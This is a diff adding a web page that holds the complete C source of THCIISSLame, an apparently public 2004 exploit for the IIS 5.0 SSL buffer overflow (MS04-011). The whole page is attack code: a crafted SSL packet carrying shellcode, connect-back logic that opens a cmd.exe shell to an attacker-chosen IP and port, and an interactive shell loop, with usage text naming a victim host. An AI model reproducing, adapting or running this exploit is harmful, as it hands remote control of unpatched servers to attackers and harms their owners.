@@ -1,0 +1,256 @@
+<html><head><title>MS Windows IIS 5.0 SSL Remote buffer overflow Exploit (MS04-011)
+</title></head><pre>/*****************************************************************************/
+/* THCIISSLame 0.3 - IIS 5 SSL remote root exploit                           */
+/* Exploit by: Johnny Cyberpunk (jcyberpunk@thc.org)                         */
+/* THC PUBLIC SOURCE MATERIALS                                               */
+/*                                                                           */
+/* Bug was found by Internet Security Systems                                */
+/* Reversing credits of the bug go to Halvar Flake                           */
+/*                                                                           */
+/* compile with MS Visual C++ : cl THCIISSLame.c                             */
+/*                                                                           */
+/* v0.3 - removed sleep[500]; and fixed the problem with zero ips/ports      */
+/* v0.2 - This little update uses a connectback shell !                      */
+/* v0.1 - First release with portbinding shell on 31337                      */
+/*                                                                           */
+/* At least some greetz fly to : THC, Halvar Flake, FX, gera, MaXX, dvorak,  */
+/* scut, stealth, FtR and Random                                             */
+/*****************************************************************************/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;winsock2.h&gt;
+
+#pragma comment(lib, &quot;ws2_32.lib&quot;)
+
+#define jumper    &quot;\xeb\x0f&quot;
+#define greetings_to_microsoft &quot;\x54\x48\x43\x4f\x57\x4e\x5a\x49\x49\x53\x21&quot;
+
+char sslshit[] = &quot;\x80\x62\x01\x02\xbd\x00\x01\x00\x01\x00\x16\x8f\x82\x01\x00\x00\x00&quot;;
+
+char shellcode[] =
+&quot;\xeb\x25\xe9\xfa\x99\xd3\x77\xf6\x02\x06\x6c\x59\x6c\x59\xf8&quot;
+&quot;\x1d\x9c\xde\x8c\xd1\x4c\x70\xd4\x03\x58\x46\x57\x53\x32\x5f&quot;
+&quot;\x33\x32\x2e\x44\x4c\x4c\x01\xeb\x05\xe8\xf9\xff\xff\xff\x5d&quot;
+&quot;\x83\xed\x2c\x6a\x30\x59\x64\x8b\x01\x8b\x40\x0c\x8b\x70\x1c&quot;
+&quot;\xad\x8b\x78\x08\x8d\x5f\x3c\x8b\x1b\x01\xfb\x8b\x5b\x78\x01&quot;
+&quot;\xfb\x8b\x4b\x1c\x01\xf9\x8b\x53\x24\x01\xfa\x53\x51\x52\x8b&quot;
+&quot;\x5b\x20\x01\xfb\x31\xc9\x41\x31\xc0\x99\x8b\x34\x8b\x01\xfe&quot;
+&quot;\xac\x31\xc2\xd1\xe2\x84\xc0\x75\xf7\x0f\xb6\x45\x09\x8d\x44&quot;
+&quot;\x45\x08\x66\x39\x10\x75\xe1\x66\x31\x10\x5a\x58\x5e\x56\x50&quot;
+&quot;\x52\x2b\x4e\x10\x41\x0f\xb7\x0c\x4a\x8b\x04\x88\x01\xf8\x0f&quot;
+&quot;\xb6\x4d\x09\x89\x44\x8d\xd8\xfe\x4d\x09\x75\xbe\xfe\x4d\x08&quot;
+&quot;\x74\x17\xfe\x4d\x24\x8d\x5d\x1a\x53\xff\xd0\x89\xc7\x6a\x02&quot;
+&quot;\x58\x88\x45\x09\x80\x45\x79\x0c\xeb\x82\x50\x8b\x45\x04\x35&quot;
+&quot;\x93\x93\x93\x93\x89\x45\x04\x66\x8b\x45\x02\x66\x35\x93\x93&quot;
+&quot;\x66\x89\x45\x02\x58\x89\xce\x31\xdb\x53\x53\x53\x53\x56\x46&quot;
+&quot;\x56\xff\xd0\x89\xc7\x55\x58\x66\x89\x30\x6a\x10\x55\x57\xff&quot;
+&quot;\x55\xe0\x8d\x45\x88\x50\xff\x55\xe8\x55\x55\xff\x55\xec\x8d&quot;
+&quot;\x44\x05\x0c\x94\x53\x68\x2e\x65\x78\x65\x68\x5c\x63\x6d\x64&quot;
+&quot;\x94\x31\xd2\x8d\x45\xcc\x94\x57\x57\x57\x53\x53\xfe\xca\x01&quot;
+&quot;\xf2\x52\x94\x8d\x45\x78\x50\x8d\x45\x88\x50\xb1\x08\x53\x53&quot;
+&quot;\x6a\x10\xfe\xce\x52\x53\x53\x53\x55\xff\x55\xf0\x6a\xff\xff&quot;
+&quot;\x55\xe4&quot;;
+
+void usage();
+void shell(int sock);
+
+int main(int argc, char *argv[])
+{  
+  unsigned int i,sock,sock2,sock3,addr,rc,len=16;
+  unsigned char *badbuf,*p;
+  unsigned long offset = 0x6741a1cd;
+  unsigned long XOR = 0xffffffff;
+  unsigned long XORIP = 0x93939393;
+  unsigned short XORPORT = 0x9393;
+
+  unsigned short cbport;
+  unsigned long  cbip;
+
+  struct sockaddr_in mytcp;
+  struct hostent * hp;
+  WSADATA wsaData;
+
+  printf(&quot;\nTHCIISSLame v0.3 - IIS 5.0 SSL remote root exploit\n&quot;);
+  printf(&quot;tested on Windows 2000 Server german/english SP4\n&quot;);
+  printf(&quot;by Johnny Cyberpunk (jcyberpunk@thc.org)\n&quot;);
+
+  if(argc&lt;4 || argc&gt;4)
+   usage();
+
+  badbuf = malloc(352);
+  memset(badbuf,0,352);
+
+  printf(&quot;\n[*] building buffer\n&quot;);
+
+  p = badbuf;
+
+  memcpy(p,sslshit,sizeof(sslshit));
+
+  p+=sizeof(sslshit)-1;
+  
+  strcat(p,jumper);
+
+  strcat(p,greetings_to_microsoft);
+
+  offset^=XOR;
+  strncat(p,(unsigned char *)&amp;offset,4);
+
+  cbport = htons((unsigned short)atoi(argv[3]));
+  cbip = inet_addr(argv[2]);
+  cbport ^= XORPORT;
+  cbip ^= XORIP;
+  memcpy(&amp;shellcode[2],&amp;cbport,2);
+  memcpy(&amp;shellcode[4],&amp;cbip,4);
+
+  strcat(p,shellcode);
+  
+  if (WSAStartup(MAKEWORD(2,1),&amp;wsaData) != 0)
+  {
+   printf(&quot;WSAStartup failed !\n&quot;);
+   exit(-1);
+  }
+  
+  hp = gethostbyname(argv[1]);
+
+  if (!hp){
+   addr = inet_addr(argv[1]);
+  }
+  if ((!hp)  &amp;&amp; (addr == INADDR_NONE) )
+  {
+   printf(&quot;Unable to resolve %s\n&quot;,argv[1]);
+   exit(-1);
+  }
+
+  sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+  if (!sock)
+  { 
+   printf(&quot;socket() error...\n&quot;);
+   exit(-1);
+  }
+  
+  if (hp != NULL)
+   memcpy(&amp;(mytcp.sin_addr),hp-&gt;h_addr,hp-&gt;h_length);
+  else
+   mytcp.sin_addr.s_addr = addr;
+
+  if (hp)
+   mytcp.sin_family = hp-&gt;h_addrtype;
+  else
+   mytcp.sin_family = AF_INET;
+
+  mytcp.sin_port=htons(443);
+
+  printf(&quot;[*] connecting the target\n&quot;);
+
+  rc=connect(sock, (struct sockaddr *) &amp;mytcp, sizeof (struct sockaddr_in));
+  if(rc==0)
+  {
+      send(sock,badbuf,351,0);
+      printf(&quot;[*] exploit send\n&quot;);
+  
+      mytcp.sin_addr.s_addr = 0;
+      mytcp.sin_port=htons((unsigned short)atoi(argv[3]));
+
+      sock2=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+      
+      rc=bind(sock2,(struct sockaddr *)&amp;mytcp,16);
+      if(rc!=0)
+      {
+       printf(&quot;bind error() %d\n&quot;,WSAGetLastError());
+       exit(-1);
+      }
+   
+      rc=listen(sock2,1);
+      if(rc!=0)
+      {
+       printf(&quot;listen error()\n&quot;);
+       exit(-1);
+      }
+
+      printf(&quot;[*] waiting for shell\n&quot;);
+      sock3 = accept(sock2, (struct sockaddr*)&amp;mytcp,&amp;len); 
+      if(sock3)
+      { 
+       printf(&quot;[*] Exploit successful ! Have fun !\n&quot;);
+       printf(&quot;[*] --------------------------------------------------------------------\n\n&quot;);
+       shell(sock3);
+      }
+  }
+  else
+  {
+   printf(&quot;\nCan't connect to ssl port 443!\n&quot;);
+   exit(-1);
+  }
+  
+  shutdown(sock,1);
+  closesocket(sock);
+  shutdown(sock,2);
+  closesocket(sock2);
+  shutdown(sock,3);
+  closesocket(sock3);
+
+  free(badbuf);
+
+  exit(0);
+}
+ 
+void usage()
+{
+ unsigned int a;
+ printf(&quot;\nUsage:  &lt;victim-host&gt; &lt;connectback-ip&gt; &lt;connectback port&gt;\n&quot;);
+ printf(&quot;Sample: THCIISSLame www.lameiss.com 31.33.7.23 31337\n\n&quot;);
+ exit(0);
+}
+
+void shell(int sock)
+{
+ int l;
+ char buf[1024];
+ struct timeval time;
+ unsigned long ul[2];
+
+ time.tv_sec = 1;
+ time.tv_usec = 0;
+
+ while (1)
+ {
+  ul[0] = 1;
+  ul[1] = sock;
+
+  l = select (0, (fd_set *)&amp;ul, NULL, NULL, &amp;time);
+  if(l == 1)
+  {  	
+   l = recv (sock, buf, sizeof (buf), 0);
+   if (l &lt;= 0)
+   {
+    printf (&quot;bye bye...\n&quot;);
+    return;
+   }
+  l = write (1, buf, l);
+   if (l &lt;= 0)
+   {
+    printf (&quot;bye bye...\n&quot;);
+    return;
+   }
+  }
+  else
+  {
+   l = read (0, buf, sizeof (buf));
+   if (l &lt;= 0)
+   {
+    printf(&quot;bye bye...\n&quot;);
+    return;
+   }
+   l = send(sock, buf, l, 0);
+   if (l &lt;= 0)
+   {
+    printf(&quot;bye bye...\n&quot;);
+    return;
+   }
+  }
+ }
+}
+
+// milw0rm.com [2004-04-21]</pre></html>
